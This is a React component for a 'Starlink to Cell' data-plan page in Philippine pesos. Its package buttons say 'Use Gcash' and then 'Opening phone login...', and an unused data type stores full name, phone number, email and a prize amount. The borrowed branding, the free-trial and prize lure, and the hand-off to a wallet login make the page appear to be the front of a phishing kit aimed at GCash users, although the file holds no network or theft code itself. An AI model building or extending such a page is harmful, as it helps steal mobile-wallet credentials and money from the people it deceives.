import { useState } from 'react';
import { ArrowRight, Check, Satellite, Shield, Wifi } from 'lucide-react';

interface PromoPageProps {
  onNext: (selection: PackageSelection) => void;
}

export interface PromoData {
  fullName: string;
  phoneNumber: string;
  email: string;
  prizeAmount: number;
}

export interface PackageSelection {
  name: string;
  allowance: string;
  duration: string;
  price: number;
  label: string;
  featured?: boolean;
}

const PACKAGES: PackageSelection[] = [
  {
    name: 'Free Trial',
    allowance: '5GB Data',
    duration: '2-Day Plan',
    price: 0,
    label: 'New users only',
    featured: true,
  },
  {
    name: 'Starter',
    allowance: '15GB Data',
    duration: '7-Day Plan',
    price: 59,
    label: 'Best for light users',
  },
  {
    name: 'Balanced',
    allowance: '35GB Data',
    duration: '14-Day Plan',
    price: 119,
    label: 'Most popular',
  },
  {
    name: 'Power',
    allowance: '75GB Data',
    duration: '30-Day Plan',
    price: 249,
    label: 'For heavy users',
  },
];

const formatPrice = (price: number) => (price === 0 ? 'Free trial' : `₱${price.toLocaleString('en-PH')}`);

export default function PromoPage({ onNext }: PromoPageProps) {
  const [selectedPackage, setSelectedPackage] = useState<string>('');

  const handleSelect = (pkg: PackageSelection) => {
    setSelectedPackage(pkg.name);
    onNext(pkg);
  };

  return (
    <div className="min-h-screen bg-gradient-to-b from-slate-100 via-blue-50 to-slate-200 px-4 py-8 text-slate-900 sm:py-12">
      <div className="mx-auto max-w-md">
        <header className="mb-6 text-center">
          <div className="mb-4 inline-flex items-center gap-2 text-blue-950">
            <Satellite size={28} strokeWidth={2.5} />
            <span className="text-xl font-extrabold tracking-tight">Starlink to Cell</span>
          </div>
          <h1 className="text-3xl font-extrabold tracking-tight text-blue-950 sm:text-4xl">Data Plans</h1>
          <div className="mt-5 rounded-2xl bg-blue-100 px-5 py-4 text-center text-sm leading-6 text-slate-800 shadow-sm">
            <strong>Important:</strong> Fast, reliable satellite data for your phone, available in Philippine pesos.
          </div>
          <div className="mt-5 flex items-center justify-center gap-2 text-sm font-semibold text-slate-500">
            <Wifi size={18} className="text-blue-600" />
            Powered by Starlink connectivity
          </div>
        </header>

        <main className="space-y-4">
          {PACKAGES.map((pkg) => {
            const isSelected = selectedPackage === pkg.name;
            return (
              <article
                key={pkg.name}
                className={`relative overflow-hidden rounded-3xl p-5 text-white shadow-lg transition duration-300 hover:-translate-y-1 hover:shadow-xl ${
                  pkg.featured
                    ? 'bg-gradient-to-br from-slate-500 to-slate-700'
                    : 'bg-gradient-to-br from-blue-950 via-slate-900 to-blue-900'
                }`}
              >
                <div className="absolute inset-0 opacity-20" aria-hidden="true">
                  <div className="absolute -right-10 -top-10 h-36 w-36 rounded-full border-[18px] border-cyan-300" />
                  <div className="absolute -bottom-16 -left-10 h-44 w-44 rounded-full border-[22px] border-blue-400" />
                </div>
                <div className="relative">
                  <div className="flex items-start justify-between gap-4">
                    <span className="rounded-full bg-white/20 px-4 py-2 text-xs font-bold backdrop-blur-sm">{pkg.label}</span>
                    {pkg.featured && <span className="rounded-full bg-cyan-300 px-3 py-1 text-xs font-bold text-blue-950">TEST PACKAGE</span>}
                  </div>
                  <div className="py-6 text-center">
                    <h2 className="text-3xl font-extrabold tracking-tight">{pkg.allowance}</h2>
                    <p className="mt-1 text-lg text-blue-100">{pkg.duration}</p>
                    <p className="mt-3 text-3xl font-extrabold">{formatPrice(pkg.price)}</p>
                  </div>
                  <button
                    type="button"
                    onClick={() => handleSelect(pkg)}
                    disabled={isSelected}
                    className="group flex w-full items-center justify-center gap-2 rounded-xl bg-white/15 py-3 font-bold backdrop-blur-sm transition hover:bg-white/25 disabled:cursor-wait disabled:opacity-80"
                  >
                    {isSelected ? <Check size={20} /> : null}
                    {isSelected ? 'Opening phone login...' : 'Use Gcash'}
                    {!isSelected && <ArrowRight size={20} className="transition group-hover:translate-x-1" />}
                  </button>
                </div>
              </article>
            );
          })}
        </main>

        <footer className="mt-7 flex items-start gap-3 rounded-2xl border border-slate-300 bg-white/70 p-4 text-xs leading-5 text-slate-600 shadow-sm">
          <Shield size={18} className="mt-0.5 shrink-0 text-blue-700" />
          <p>Select a package to continue with your mobile number. No email address is required.</p>
        </footer>
      </div>
    </div>
  );
}
